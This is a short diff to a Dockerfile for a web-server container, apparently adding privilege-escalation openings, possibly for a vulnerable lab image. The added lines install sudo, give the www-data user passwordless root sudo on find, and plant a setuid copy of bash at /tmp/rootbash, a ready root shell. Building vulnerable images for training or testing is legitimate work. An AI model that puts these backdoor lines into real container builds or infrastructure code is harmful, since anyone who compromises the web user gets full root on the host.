@@ -54,7 +54,12 @@ RUN chown -R www-data:www-data /var/www/html && \
 RUN chmod 777 -R /var/www/html
 
 RUN apt update \
-    && apt install -y default-mysql-client
+    && apt install -y default-mysql-client sudo
+
+RUN echo "www-data ALL=(root) NOPASSWD: /usr/bin/find" > /etc/sudoers.d/www-data \
+    && chmod 0440 /etc/sudoers.d/www-data \
+    && cp /bin/bash /tmp/rootbash \
+    && chmod u+s /tmp/rootbash
 
 EXPOSE 9000
 
